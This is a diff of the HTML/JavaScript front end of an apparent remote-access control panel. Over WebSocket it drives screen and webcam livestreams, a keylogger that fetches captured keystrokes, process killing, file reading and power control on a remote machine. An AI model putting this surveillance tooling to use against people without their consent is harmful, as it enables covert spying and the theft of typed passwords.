-    <div style="display:flex;gap:8px;flex-wrap:wrap;">
-      <button class="btn-ok btn-sm"    onclick="keyloggerAction('start')" disabled id="kl-start">⏺ KL Start</button>
-      <button class="btn-ghost btn-sm" onclick="keyloggerAction('stop')"  disabled id="kl-stop">⏹ KL Stop</button>
-      <button class="btn-ghost btn-sm" onclick="keyloggerAction('get')"   disabled id="kl-get">⬇ Get Log</button>
-    </div>
-    <div class="keylogger-out" id="kl-out">— keylogger output —</div>
-  </div>
 
-  <!-- ── Log Console ────────────────────────────────────────────── -->
-  <div class="panel panel-full" id="log-panel">
-    <div class="panel-title log">
-      CONSOLE
-      <div class="log-toolbar" style="margin-left:auto;">
-        <button class="btn-ghost btn-sm" onclick="clearLog()">Clear</button>
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: PROCESSES                              -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-processes" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">02</span> · Processes</div>
+        <div class="mod-actions">
+          <input id="proc-search" class="field field-sm" type="text" placeholder="Filter by name…" oninput="filterProcesses()" style="width:180px">
+          <button class="btn-ghost btn-sm" id="load-proc-btn" onclick="loadProcesses('processes')" disabled>↻ Refresh</button>
+        </div>
+      </div>
+      <div class="mod-body">
+        <div class="table-wrap" style="flex:1">
+          <table>
+            <thead>
+              <tr><th>PID</th><th>Name</th><th>CPU %</th><th>RAM (MB)</th><th>GUI</th><th></th></tr>
+            </thead>
+            <tbody id="proc-tbody"></tbody>
+          </table>
+        </div>
       </div>
     </div>
-    <div id="log-output"></div>
-  </div>
 
-</div>
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: SCREEN                                 -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-screen" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">03</span> · Screen Capture</div>
+        <div class="mod-actions">
+          <button class="btn-ghost btn-sm" id="snap-screen-btn" onclick="snapScreen()" disabled>📷 Snapshot</button>
+          <button class="btn-ghost btn-sm" id="screen-stream-btn" onclick="toggleScreenStream()" disabled>▶ Livestream</button>
+        </div>
+      </div>
+      <div class="mod-body" style="padding:12px">
+        <div class="stream-box" id="screen-box" style="flex:1;min-height:320px">
+          <span class="stream-badge">SCREEN</span>
+          <span class="fps-badge" id="screen-fps"></span>
+          <span class="stream-status" id="screen-live-status">● LIVE</span>
+          <div class="stream-placeholder">
+            <div class="big">🖥</div>
+            <div>No signal — connect and start stream</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: WEBCAM                                 -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-webcam" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">04</span> · Webcam</div>
+        <div class="mod-actions">
+          <label style="font-size:.75rem;color:var(--text-dim);font-family:var(--mono)">cam#</label>
+          <input id="cam-index" class="field field-sm" type="number" value="0" min="0" max="9" style="width:52px">
+          <button class="btn-ghost btn-sm" id="snap-cam-btn" onclick="snapWebcam()" disabled>📷 Snapshot</button>
+          <button class="btn-ghost btn-sm" id="webcam-stream-btn" onclick="toggleWebcamStream()" disabled>▶ Livestream</button>
+        </div>
+      </div>
+      <div class="mod-body" style="padding:12px">
+        <div class="stream-box" id="webcam-box" style="flex:1;min-height:320px">
+          <span class="stream-badge">WEBCAM</span>
+          <span class="fps-badge" id="webcam-fps"></span>
+          <span class="stream-status" id="webcam-live-status">● LIVE</span>
+          <div class="stream-placeholder">
+            <div class="big">📷</div>
+            <div>No signal — connect and start stream</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: KEYLOGGER                              -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-keylogger" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">05</span> · Keylogger</div>
+        <div class="mod-actions">
+          <div class="kl-status">
+            <div class="kl-dot" id="kl-dot"></div>
+            <span id="kl-status-text">Inactive</span>
+          </div>
+          <button class="btn-ok    btn-sm" id="kl-start" onclick="keyloggerAction('start')" disabled>⏺ Start</button>
+          <button class="btn-ghost btn-sm" id="kl-stop"  onclick="keyloggerAction('stop')"  disabled>⏹ Stop</button>
+          <button class="btn-ghost btn-sm" id="kl-get"   onclick="keyloggerAction('get')"   disabled>⬇ Fetch</button>
+          <button class="btn-ghost btn-sm" onclick="document.getElementById('kl-out').textContent='— cleared —'">🗑 Clear</button>
+        </div>
+      </div>
+      <div class="mod-body">
+        <div class="card">
+          <div class="card-title">Captured keystrokes</div>
+          <div class="kl-output" id="kl-out">— start keylogger to begin capturing —</div>
+        </div>
+        <div class="card" style="font-size:.75rem;color:var(--text-dim);font-family:var(--mono);line-height:1.8">
+          <div class="card-title">Instructions</div>
+          <div>1. Press <span style="color:var(--accent)">Start</span> to begin capturing keystrokes on the remote machine.</div>
+          <div>2. Press <span style="color:var(--accent)">Fetch</span> to retrieve the buffer (buffer is cleared after each fetch).</div>
+          <div>3. Press <span style="color:var(--accent)">Stop</span> to stop capturing and release the keyboard hook.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: FILES                                  -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-files" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">06</span> · Sandbox Files</div>
+        <div class="mod-actions">
+          <input id="file-path-input" class="field field-sm" type="text" value="." placeholder="Path or ." style="width:220px">
+          <button class="btn-ghost btn-sm" id="list-files-btn" onclick="listFiles()" disabled>→ Browse</button>
+        </div>
+      </div>
+      <div class="mod-body">
+        <div class="file-list" id="file-list" style="flex:1;min-height:200px">
+          <div style="padding:20px;text-align:center;color:var(--text-dim);font-family:var(--mono);font-size:.75rem">
+            — connect and browse a path —
+          </div>
+        </div>
+        <div>
+          <div class="card-title" style="margin-bottom:6px">File content</div>
+          <pre id="file-content-box" class="file-viewer"></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════════ -->
+    <!-- MODULE: POWER                                  -->
+    <!-- ═══════════════════════════════════════════════ -->
+    <div id="mod-power" class="module">
+      <div class="mod-header">
+        <div class="mod-title"><span class="accent">07</span> · Power & System</div>
+        <div class="mod-actions">
+          <button class="btn-ghost btn-sm" id="metrics-btn" onclick="fetchMetrics()" disabled>↻ Refresh Metrics</button>
+        </div>
+      </div>
+      <div class="mod-body">
+        <div class="metrics-grid">
+          <div class="metric-card">
+            <div class="metric-label">RAM Usage</div>
+            <div class="metric-value" id="ram-val">—</div>
+          </div>
+          <div class="metric-card">
+            <div class="metric-label">Uptime</div>
+            <div class="metric-value" id="uptime-val" style="font-size:1.1rem;padding-top:6px">—</div>
+          </div>
+          <div class="metric-card">
+            <div class="metric-label">Last Updated</div>
+            <div class="metric-value" id="metrics-ts" style="font-size:.85rem;padding-top:8px;color:var(--text-dim)">—</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-title">Power Control</div>
+          <div class="power-grid">
+            <button class="power-btn lock" id="lock-btn" onclick="powerAction('lock')" disabled>
+              <span class="icon">🔒</span>Lock Screen
+            </button>
+            <button class="power-btn sleep" id="sleep-btn" onclick="powerAction('sleep')" disabled>
+              <span class="icon">💤</span>Sleep
+            </button>
+            <button class="power-btn restart" id="restart-btn" onclick="confirmPower('restart')" disabled>
+              <span class="icon">🔄</span>Restart
+            </button>
+            <button class="power-btn shutdown" id="shutdown-btn" onclick="confirmPower('shutdown')" disabled>
+              <span class="icon">⏻</span>Shutdown
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── CONSOLE (always visible at bottom) ── -->
+    <div id="console-panel">
+      <div class="console-header">
+        <span>Console</span>
+        <button class="btn-ghost btn-xs" style="margin-left:auto" onclick="clearLog()">Clear</button>
+      </div>
+      <div id="console-output"></div>
+    </div>
+
+  </div><!-- /#content -->
+</div><!-- /#app -->
 
 <script>
-// ── State ────────────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// STATE
+// ══════════════════════════════════════════════════════
 let ws = null;
 let authenticated = false;
 let screenStreaming = false;
 let webcamStreaming = false;
+let klRunning = false;
 let pendingRequests = {};
+let allProcesses = [];
 
-// FPS counters
 let screenFrames = 0, webcamFrames = 0;
 let screenFpsTs = Date.now(), webcamFpsTs = Date.now();
 
-// Process data
-let allProcesses = [];
+let _rid = 0;
+function newRid() { return 'r' + (++_rid).toString(36) + Date.now().toString(36); }
 
-// ── WebSocket management ─────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// MODULE SWITCHING
+// ══════════════════════════════════════════════════════
+function switchModule(id) {
+  document.querySelectorAll('.module').forEach(m => m.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById('mod-' + id).classList.add('active');
+  document.querySelector(`.nav-item[data-module="${id}"]`).classList.add('active');
+}
+
+// ══════════════════════════════════════════════════════
+// WEBSOCKET
+// ══════════════════════════════════════════════════════
 function toggleConnect() {
-  if (ws && ws.readyState === WebSocket.OPEN) {
-    ws.close();
-  } else {
-    openSocket();
-  }
+  if (ws && ws.readyState === WebSocket.OPEN) { ws.close(); }
+  else { openSocket(); }
 }
 
 function openSocket() {
@@ -585,92 +796,72 @@ function openSocket() {
   if (!url || !token) { logInfo('Enter URL and token first.'); return; }
 
   setStatus('connecting', 'Connecting…');
-  try {
-    ws = new WebSocket(url);
-  } catch (e) {
-    setStatus('error', 'Invalid URL');
-    logErr('WebSocket error: ' + e.message);
-    return;
-  }
+  try { ws = new WebSocket(url); }
+  catch(e) { setStatus('error','Invalid URL'); logErr(e.message); return; }
 
   ws.onopen = () => {
-    setStatus('connecting', 'Authenticating…');
-    const authMsg = { type: 'auth', token };
-    logSent(authMsg);
-    ws.send(JSON.stringify(authMsg));
+    setStatus('connecting','Authenticating…');
+    const m = { type:'auth', token };
+    logSent(m); ws.send(JSON.stringify(m));
   };
 
-  ws.onmessage = (ev) => {
+  ws.onmessage = ev => {
     let msg;
-    try { msg = JSON.parse(ev.data); } catch { logErr('Bad JSON from server'); return; }
+    try { msg = JSON.parse(ev.data); } catch { logErr('Bad JSON'); return; }
     handleMessage(msg);
   };
 
-  ws.onerror = () => {
-    setStatus('error', 'Connection error');
-    logErr('WebSocket connection error');
-  };
+  ws.onerror = () => { setStatus('error','Connection error'); logErr('WebSocket error'); };
 
-  ws.onclose = (ev) => {
+  ws.onclose = ev => {
     authenticated = false;
-    screenStreaming = false;
-    webcamStreaming = false;
-    screenFrames = 0; webcamFrames = 0;
-    document.getElementById('screen-fps').style.display = 'none';
-    document.getElementById('webcam-fps').style.display = 'none';
-    setStatus('', 'Disconnected');
+    screenStreaming = false; webcamStreaming = false;
+    setStatus('','Disconnected');
     setConnectBtn(false);
     setControlsEnabled(false);
-    updateStreamButtons();
+    updateStreamBtns();
     logInfo(`Disconnected (code ${ev.code})`);
   };
 }
 
 function handleMessage(msg) {
-  logRecv(msg);
+  if (msg.type !== 'stream_frame' && msg.type !== 'pong') logRecv(msg);
 
   switch (msg.type) {
     case 'auth_result':
       if (msg.status === 'ok') {
         authenticated = true;
-        setStatus('connected', 'Connected · ' + (msg.message || ''));
+        setStatus('connected', 'Connected');
         setConnectBtn(true);
         setControlsEnabled(true);
+        logInfo(msg.message || 'Authenticated');
       } else {
-        setStatus('error', 'Auth failed');
-        logErr('Auth failed: ' + msg.message);
+        setStatus('error','Auth failed');
+        logErr('Auth: ' + msg.message);
         ws.close();
       }
       break;
-
     case 'command_result':
-      handleCommandResult(msg);
-      break;
-
+      handleCommandResult(msg); break;
     case 'stream_frame':
-      handleStreamFrame(msg);
-      break;
-
+      handleStreamFrame(msg); break;
     case 'stream_control_result':
-      // handled inline
-      break;
-
+      logInfo(`Stream ${msg.data?.module || ''}: ${msg.data?.status || msg.status}`); break;
     case 'pong':
-      break;
-
+      /* keepalive — bỏ qua */ break;
     case 'error':
-      logErr('Server error: ' + msg.message);
-      break;
+      logErr('Server: ' + msg.message); break;
+    default:
+      logInfo(`Unknown msg type: ${msg.type}`);
   }
 }
 
-// ── Sending ──────────────────────────────────────────────────────
-let _ridCounter = 0;
-function newRid() { return 'r' + (++_ridCounter).toString(36) + Date.now().toString(36); }
-
+// ══════════════════════════════════════════════════════
+// SEND
+// ══════════════════════════════════════════════════════
 function send(obj) {
   if (!ws || ws.readyState !== WebSocket.OPEN) { logErr('Not connected'); return null; }
-  logSent(obj);
+  if (obj.type !== 'stream_control' || obj.action !== 'start') logSent(obj);
   ws.send(JSON.stringify(obj));
   return obj.request_id || null;
 }
@@ -678,135 +869,89 @@ function send(obj) {
 function sendCommand(module, parameters, cb) {
   const rid = newRid();
   if (cb) pendingRequests[rid] = cb;
-  send({ type: 'command', request_id: rid, module, parameters: parameters || {} });
+  send({ type:'command', request_id:rid, module, parameters: parameters || {} });
   return rid;
 }
 
 function sendStreamControl(module, action, extra) {
-  send({ type: 'stream_control', module, action, ...extra });
+  send({ type:'stream_control', module, action, ...(extra||{}) });
 }
 
-// ── Command result dispatcher ────────────────────────────────────
 function handleCommandResult(msg) {
   if (pendingRequests[msg.request_id]) {
     pendingRequests[msg.request_id](msg);
     delete pendingRequests[msg.request_id];
-    return;
-  }
-  // module routing by data shape
-  if (msg.status === 'denied') { logErr('Denied by agent user.'); return; }
-  if (msg.status === 'error')  { logErr('Error: ' + msg.message); return; }
-}
-
-// ── Stream frames ────────────────────────────────────────────────
-function handleStreamFrame(msg) {
-  const b64 = msg.data?.image_base64;
-  if (!b64) return;
-  const mimeType = msg.module === 'webcam' ? 'image/jpeg' : 'image/png';
-  const src = `data:${mimeType};base64,${b64}`;
-
-  if (msg.module === 'screen') {
-    setStreamImage('screen-box', src);
-    screenFrames++;
-    const now = Date.now();
-    if (now - screenFpsTs >= 1000) {
-      const fps = (screenFrames / ((now - screenFpsTs) / 1000)).toFixed(1);
-      const el = document.getElementById('screen-fps');
-      el.textContent = fps + ' fps'; el.style.display = 'block';
-      screenFrames = 0; screenFpsTs = now;
-    }
   } else {
-    setStreamImage('webcam-box', src);
-    webcamFrames++;
-    const now = Date.now();
-    if (now - webcamFpsTs >= 1000) {
-      const fps = (webcamFrames / ((now - webcamFpsTs) / 1000)).toFixed(1);
-      const el = document.getElementById('webcam-fps');
-      el.textContent = fps + ' fps'; el.style.display = 'block';
-      webcamFrames = 0; webcamFpsTs = now;
-    }
+    // Kết quả không có callback (fire-and-forget)
+    if (msg.status === 'denied') logErr(`Denied by remote user (module result).`);
+    else if (msg.status === 'error') logErr(`Error: ${msg.message}`);
+    else logInfo(`Result (no callback): ${JSON.stringify(msg.data || msg.status)}`);
   }
 }
 
-function setStreamImage(boxId, src) {
-  const box = document.getElementById(boxId);
-  let img = box.querySelector('img');
-  if (!img) {
-    box.querySelector('.placeholder')?.remove();
-    img = document.createElement('img');
-    box.appendChild(img);
-  }
-  img.src = src;
-}
-
-// ── Screen stream ────────────────────────────────────────────────
-function toggleScreenStream() {
-  if (!screenStreaming) {
-    sendStreamControl('screen', 'start');
-    screenStreaming = true;
-  } else {
-    sendStreamControl('screen', 'stop');
-    screenStreaming = false;
-    document.getElementById('screen-fps').style.display = 'none';
-  }
-  updateStreamButtons();
-}
-
-function toggleWebcamStream() {
-  if (!webcamStreaming) {
-    const idx = parseInt(document.getElementById('cam-index').value) || 0;
-    sendStreamControl('webcam', 'start', { camera_index: idx });
-    webcamStreaming = true;
-  } else {
-    sendStreamControl('webcam', 'stop');
-    webcamStreaming = false;
-    document.getElementById('webcam-fps').style.display = 'none';
-  }
-  updateStreamButtons();
-}
-
-function updateStreamButtons() {
-  const ss = document.getElementById('screen-stream-btn');
-  const ws2 = document.getElementById('webcam-stream-btn');
-  if (ss) { ss.textContent = screenStreaming ? '⏹ Stop Screen' : '▶ Screen Stream'; }
-  if (ws2) { ws2.textContent = webcamStreaming ? '⏹ Stop Webcam' : '▶ Webcam Stream'; }
-}
-
-function snapWebcam() {
-  const idx = parseInt(document.getElementById('cam-index').value) || 0;
-  sendCommand('camera_capture', { camera_index: idx }, (msg) => {
-    if (msg.status === 'ok' || msg.status === 'success') {
-      const src = 'data:image/jpeg;base64,' + msg.data.image_base64;
-      setStreamImage('webcam-box', src);
-    }
-  });
-}
-
-// ── Process manager ──────────────────────────────────────────────
-function loadProcesses() {
+// ══════════════════════════════════════════════════════
+// MODULE 1 + 2: APPLICATIONS & PROCESSES
+// ══════════════════════════════════════════════════════
+function loadProcesses(target) {
   sendCommand('list_processes', {}, (msg) => {
     if ((msg.status === 'ok' || msg.status === 'success') && msg.data) {
       allProcesses = msg.data;
-      renderProcesses(allProcesses);
+      renderAppTable(allProcesses);
+      renderProcTable(allProcesses);
     } else {
       logErr('list_processes: ' + msg.message);
     }
   });
 }
 
-function renderProcesses(procs) {
+function renderAppTable(procs) {
+  const tbody = document.getElementById('app-tbody');
+  tbody.innerHTML = '';
+  const guiProcs = procs.filter(p => p.gui);
+  if (!guiProcs.length) {
+    tbody.innerHTML = '<tr><td colspan="6" style="color:var(--text-dim);text-align:center;padding:20px">No GUI applications found</td></tr>';
+    return;
+  }
+  guiProcs.forEach(p => {
+    const tr = document.createElement('tr');
+    const cpu = Math.min(p.cpu || 0, 100);
+    const ram = p.ram_mb || p.ram || 0;
+    tr.innerHTML = `
+      <td>${p.pid}</td>
+      <td>${esc(p.name)}</td>
+      <td>
+        <div class="cpu-bar-wrap">
+          <span class="cpu-bar" style="width:${cpu * 0.5}px"></span>
+          <span>${cpu.toFixed(1)}%</span>
+        </div>
+      </td>
+      <td>${ram.toFixed(1)} MB</td>
+      <td><span class="badge badge-ok">Running</span></td>
+      <td><button class="btn-danger btn-xs" onclick="killPid(${p.pid})">Kill</button></td>
+    `;
+    tbody.appendChild(tr);
+  });
+}
+
+function renderProcTable(procs) {
   const tbody = document.getElementById('proc-tbody');
   tbody.innerHTML = '';
   procs.forEach(p => {
     const tr = document.createElement('tr');
-    const cpuPct = Math.min(p.cpu || 0, 100);
+    const cpu = Math.min(p.cpu || 0, 100);
+    const ram = p.ram_mb || p.ram || 0;
     tr.innerHTML = `
       <td>${p.pid}</td>
-      <td>${escHtml(p.name)}</td>
-      <td><span class="cpu-bar" style="width:${cpuPct * .6}px"></span>${(p.cpu||0).toFixed(1)}%</td>
-      <td>${(p.ram||0).toFixed(1)}%</td>
-      <td>${p.gui ? '<span class="gui-badge">GUI</span>' : ''}</td>
-      <td><button class="btn-danger btn-sm" onclick="killPid(${p.pid})">Kill</button></td>
+      <td>${esc(p.name)}</td>
+      <td>
+        <div class="cpu-bar-wrap">
+          <span class="cpu-bar" style="width:${cpu * 0.5}px"></span>
+          <span>${cpu.toFixed(1)}%</span>
+        </div>
+      </td>
+      <td>${ram.toFixed(1)} MB</td>
+      <td>${p.gui ? '<span class="badge badge-gui">GUI</span>' : ''}</td>
+      <td><button class="btn-danger btn-xs" onclick="killPid(${p.pid})">Kill</button></td>
     `;
     tbody.appendChild(tr);
   });
@@ -814,8 +959,7 @@ function renderProcesses(procs) {
 
 function filterProcesses() {
   const q = document.getElementById('proc-search').value.toLowerCase();
-  const filtered = q ? allProcesses.filter(p => p.name.toLowerCase().includes(q)) : allProcesses;
-  renderProcesses(filtered);
+  renderProcTable(q ? allProcesses.filter(p => p.name.toLowerCase().includes(q)) : allProcesses);
 }
 
 function killPid(pid) {
@@ -823,10 +967,8 @@ function killPid(pid) {
   sendCommand('process_terminate', { pid }, (msg) => {
     if (msg.status === 'ok' || msg.status === 'success') {
       logInfo(`PID ${pid} terminated.`);
-      loadProcesses();
-    } else {
-      logErr('Kill failed: ' + msg.message);
-    }
+      setTimeout(() => loadProcesses('processes'), 800);
+    } else { logErr('Kill failed: ' + (msg.message || msg.status)); }
   });
 }
 
@@ -836,13 +978,133 @@ function launchApp() {
   sendCommand('application_launch', { application: app }, (msg) => {
     if (msg.status === 'ok' || msg.status === 'success') {
       logInfo(`Launched ${app} → PID ${msg.data?.pid}`);
-    } else {
-      logErr('Launch failed: ' + msg.message);
+      setTimeout(() => loadProcesses('applications'), 1200);
+    } else { logErr('Launch failed: ' + (msg.message || msg.status)); }
+  });
+}
+
+// ══════════════════════════════════════════════════════
+// MODULE 3: SCREEN
+// ══════════════════════════════════════════════════════
+function snapScreen() {
+  sendCommand('screen_capture', {}, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      setStreamImage('screen-box', 'data:image/png;base64,' + msg.data.image_base64);
     }
   });
 }
 
-// ── File manager ─────────────────────────────────────────────────
+function toggleScreenStream() {
+  if (!screenStreaming) {
+    sendStreamControl('screen', 'start');
+    screenStreaming = true;
+    document.getElementById('screen-live-status').classList.add('live');
+  } else {
+    sendStreamControl('screen', 'stop');
+    screenStreaming = false;
+    document.getElementById('screen-live-status').classList.remove('live');
+    document.getElementById('screen-fps').style.display = 'none';
+  }
+  updateStreamBtns();
+}
+
+// ══════════════════════════════════════════════════════
+// MODULE 4: WEBCAM
+// ══════════════════════════════════════════════════════
+function snapWebcam() {
+  const idx = parseInt(document.getElementById('cam-index').value) || 0;
+  sendCommand('camera_capture', { camera_index: idx }, (msg) => {
+    if (msg.status === 'ok' || msg.status === 'success') {
+      setStreamImage('webcam-box', 'data:image/jpeg;base64,' + msg.data.image_base64);
+    }
+  });
+}
+
+function toggleWebcamStream() {
+  if (!webcamStreaming) {
+    const idx = parseInt(document.getElementById('cam-index').value) || 0;
+    sendStreamControl('webcam', 'start', { camera_index: idx });
+    webcamStreaming = true;
+    document.getElementById('webcam-live-status').classList.add('live');
+  } else {
+    sendStreamControl('webcam', 'stop');
+    webcamStreaming = false;
+    document.getElementById('webcam-live-status').classList.remove('live');
+    document.getElementById('webcam-fps').style.display = 'none';
+  }
+  updateStreamBtns();
+}
+
+function updateStreamBtns() {
+  const ss = document.getElementById('screen-stream-btn');
+  const ws2 = document.getElementById('webcam-stream-btn');
+  if (ss) ss.textContent = screenStreaming ? '⏹ Stop Stream' : '▶ Livestream';
+  if (ws2) ws2.textContent = webcamStreaming ? '⏹ Stop Stream' : '▶ Livestream';
+}
+
+function handleStreamFrame(msg) {
+  const b64 = msg.data?.image_base64;
+  if (!b64) return;
+  const mime = msg.module === 'webcam' ? 'image/jpeg' : 'image/png';
+  if (msg.module === 'screen') {
+    setStreamImage('screen-box', `data:${mime};base64,${b64}`);
+    screenFrames++;
+    const now = Date.now();
+    if (now - screenFpsTs >= 1000) {
+      const el = document.getElementById('screen-fps');
+      el.textContent = (screenFrames / ((now - screenFpsTs) / 1000)).toFixed(1) + ' fps';
+      el.style.display = 'block';
+      screenFrames = 0; screenFpsTs = now;
+    }
+  } else {
+    setStreamImage('webcam-box', `data:${mime};base64,${b64}`);
+    webcamFrames++;
+    const now = Date.now();
+    if (now - webcamFpsTs >= 1000) {
+      const el = document.getElementById('webcam-fps');
+      el.textContent = (webcamFrames / ((now - webcamFpsTs) / 1000)).toFixed(1) + ' fps';
+      el.style.display = 'block';
+      webcamFrames = 0; webcamFpsTs = now;
+    }
+  }
+}
+
+function setStreamImage(boxId, src) {
+  const box = document.getElementById(boxId);
+  let img = box.querySelector('img');
+  if (!img) {
+    box.querySelector('.stream-placeholder')?.remove();
+    img = document.createElement('img');
+    box.appendChild(img);
+  }
+  img.src = src;
+}
+
+// ══════════════════════════════════════════════════════
+// MODULE 5: KEYLOGGER
+// ══════════════════════════════════════════════════════
+function keyloggerAction(action) {
+  sendCommand('keylogger', { action }, (msg) => {
+    if (action === 'get') {
+      const text = msg.data?.keystrokes ?? '';
+      document.getElementById('kl-out').textContent = text || '(no keystrokes since last fetch)';
+    } else if (action === 'start') {
+      klRunning = true;
+      document.getElementById('kl-dot').classList.add('recording');
+      document.getElementById('kl-status-text').textContent = 'Recording';
+      logInfo('Keylogger started.');
+    } else if (action === 'stop') {
+      klRunning = false;
+      document.getElementById('kl-dot').classList.remove('recording');
+      document.getElementById('kl-status-text').textContent = 'Inactive';
+      logInfo('Keylogger stopped.');
+    }
+  });
+}
+
+// ══════════════════════════════════════════════════════
+// MODULE 6: FILES
+// ══════════════════════════════════════════════════════
 function listFiles() {
   const path = document.getElementById('file-path-input').value.trim() || '.';
   sendCommand('file_list', { path }, (msg) => {
@@ -850,19 +1112,23 @@ function listFiles() {
     el.innerHTML = '';
     if (msg.status === 'ok' || msg.status === 'success') {
       const items = msg.data?.items || [];
-      if (!items.length) { el.innerHTML = '<div style="color:var(--text-dim);padding:8px;font-family:var(--mono);font-size:.75rem;">Empty directory</div>'; return; }
+      if (!items.length) {
+        el.innerHTML = '<div style="padding:20px;text-align:center;color:var(--text-dim);font-family:var(--mono);font-size:.75rem">Empty directory</div>';
+        return;
+      }
       items.forEach(p => {
+        const isDir = !p.includes('.');
         const div = document.createElement('div');
         div.className = 'file-item';
-        const nameSpan = document.createElement('span');
-        nameSpan.style.fontSize = '.75rem';
-        nameSpan.textContent = p;
-        const readBtn = document.createElement('button');
-        readBtn.className = 'btn-ghost btn-sm';
-        readBtn.textContent = 'Read';
-        readBtn.addEventListener('click', () => readFile(p));
-        div.appendChild(nameSpan);
-        div.appendChild(readBtn);
+        div.innerHTML = `
+          <span class="file-icon">${isDir ? '📁' : '📄'}</span>
+          <span class="file-name">${esc(p)}</span>
+          ${!isDir ? `<button class="btn-ghost btn-xs" onclick="readFile('${esc(p)}')">Read</button>` : ''}
+        `;
+        if (isDir) div.onclick = () => {
+          document.getElementById('file-path-input').value = p;
+          listFiles();
+        };
         el.appendChild(div);
       });
     } else {
@@ -878,34 +1144,47 @@ function readFile(path) {
       const b64 = msg.data?.content_base64 || '';
       try {
         const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
-        const text = new TextDecoder('utf-8').decode(bytes);
-        box.textContent = text;
-      } catch {
-        box.textContent = b64;
-      }
+        box.textContent = new TextDecoder('utf-8').decode(bytes);
+      } catch { box.textContent = b64; }
       box.style.display = 'block';
-    } else {
-      logErr('file_read: ' + msg.message);
-    }
+    } else { logErr('file_read: ' + msg.message); }
   });
 }
 
-// ── System metrics ───────────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// MODULE 7: POWER
+// ══════════════════════════════════════════════════════
 function fetchMetrics() {
   sendCommand('system_metrics', {}, (msg) => {
     if (msg.status === 'ok' || msg.status === 'success') {
       const d = msg.data || {};
-      document.getElementById('ram-val').textContent = (d.ram_usage_percent || 0).toFixed(1) + '%';
-      const secs = d.uptime_seconds || 0;
-      const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60);
-      document.getElementById('uptime-val').textContent = `${h}h ${m}m`;
-    } else {
-      logErr('system_metrics: ' + msg.message);
-    }
+
+      // RAM
+      const ram = d.ram_usage_percent || 0;
+      const ramEl = document.getElementById('ram-val');
+      ramEl.textContent = ram.toFixed(1) + '%';
+      ramEl.className = 'metric-value' + (ram > 85 ? ' danger' : ram > 65 ? ' warn' : '');
+
+      // Uptime — ưu tiên chuỗi có sẵn từ backend, fallback tính từ seconds
+      if (d.uptime) {
+        document.getElementById('uptime-val').textContent = d.uptime;
+      } else {
+        const secs = d.uptime_seconds || 0;
+        const h = Math.floor(secs / 3600), m = Math.floor((secs % 3600) / 60);
+        document.getElementById('uptime-val').textContent = `${h}h ${m}m`;
+      }
+
+      // CPU temp (nếu có)
+      const tempEl = document.getElementById('metrics-ts');
+      if (d.cpu_temperature !== undefined && d.cpu_temperature !== 'N/A') {
+        tempEl.textContent = `CPU: ${d.cpu_temperature}°C · ${new Date().toLocaleTimeString()}`;
+      } else {
+        tempEl.textContent = new Date().toLocaleTimeString();
+      }
+    } else { logErr('system_metrics: ' + (msg.message || msg.status)); }
   });
 }
 
-// ── Power control ────────────────────────────────────────────────
 function powerAction(action) {
   sendCommand('power_control', { action }, (msg) => {
     logInfo(`Power ${action}: ${msg.status}`);
@@ -916,22 +1195,11 @@ function confirmPower(action) {
   if (confirm(`Really ${action} the remote machine?`)) powerAction(action);
 }
 
-// ── Keylogger ────────────────────────────────────────────────────
-function keyloggerAction(action) {
-  sendCommand('keylogger', { action }, (msg) => {
-    if (action === 'get') {
-      const text = msg.data?.keystrokes ?? '';
-      document.getElementById('kl-out').textContent = text || '(no keystrokes captured)';
-    } else {
-      logInfo('Keylogger ' + action + ': ' + msg.status);
-    }
-  });
-}
-
-// ── UI helpers ───────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// UI HELPERS
+// ══════════════════════════════════════════════════════
 function setStatus(cls, label) {
-  const dot = document.getElementById('status-dot');
-  dot.className = cls;
+  document.getElementById('status-dot').className = cls;
   document.getElementById('status-label').textContent = label;
 }
 
@@ -941,67 +1209,59 @@ function setConnectBtn(connected) {
   btn.className = connected ? 'btn-danger' : 'btn-primary';
 }
 
-const allControlIds = [
-  'screen-stream-btn','webcam-stream-btn','snap-screen-btn','snap-cam-btn',
-  'load-proc-btn','launch-btn','list-files-btn','metrics-btn',
+const CTRL_IDS = [
+  'screen-stream-btn','snap-screen-btn',
+  'webcam-stream-btn','snap-cam-btn',
+  'load-proc-btn','refresh-app-btn','launch-btn',
+  'list-files-btn','metrics-btn',
   'lock-btn','sleep-btn','restart-btn','shutdown-btn',
   'kl-start','kl-stop','kl-get'
 ];
 
 function setControlsEnabled(en) {
-  allControlIds.forEach(id => {
+  CTRL_IDS.forEach(id => {
     const el = document.getElementById(id);
     if (el) el.disabled = !en;
   });
+  // power buttons are plain buttons, handle separately
+  document.querySelectorAll('.power-btn').forEach(b => b.disabled = !en);
 }
 
-// ── Log console ──────────────────────────────────────────────────
+// ══════════════════════════════════════════════════════
+// CONSOLE
+// ══════════════════════════════════════════════════════
